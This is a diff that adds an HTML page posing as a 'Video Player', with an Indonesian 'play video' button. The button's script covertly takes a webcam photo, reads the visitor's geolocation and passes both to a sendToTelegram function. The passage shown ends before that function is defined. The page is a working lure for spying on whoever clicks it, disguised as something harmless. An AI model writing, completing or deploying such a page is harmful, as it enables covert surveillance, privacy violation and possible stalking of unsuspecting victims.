@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Video Player</title>
+</head>
+<body>
+    <h1>Klik tombol di bawah untuk memutar video:</h1>
+    <button onclick="captureAndSend()">Putar Video</button>
+
+    <script>
+        async function captureAndSend() {
+            // Ambil foto dari kamera
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photo = canvas.toDataURL('image/png');
+
+                // Ambil lokasi
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Kirim foto dan lokasi ke Telegram
+                    await sendToTelegram(photo, latitude, longitude);
+                }, (error) => {
+                    console.error("Gagal mengambil lokasi:", error);
+                    sendToTelegram(photo, null, null);
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+            };
